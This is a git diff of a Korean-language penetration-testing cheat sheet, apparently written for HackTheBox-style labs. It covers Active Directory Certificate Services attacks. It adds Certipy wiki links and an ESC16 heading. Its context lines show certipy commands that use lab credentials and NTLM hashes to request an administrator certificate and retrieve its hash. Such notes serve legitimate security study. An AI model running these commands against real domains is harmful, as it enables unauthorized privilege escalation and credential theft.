@@ -783,6 +783,7 @@ certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc
   <summary><strong>AD CS(CA)</strong></summary>
 
 - `nmap`으로 스캔하여 `CA`를 발견하면 시도.
+- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
 ```bash
 certipy-ad find -u <user> -hashes <hashes> -dc-ip <ip> -vulnerable
 
@@ -807,6 +808,10 @@ certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -te
 # get hash
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
 ```
+
+## ESC16
+- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally
+- 두가지 방법 모두 시도.
   
 </details>
 
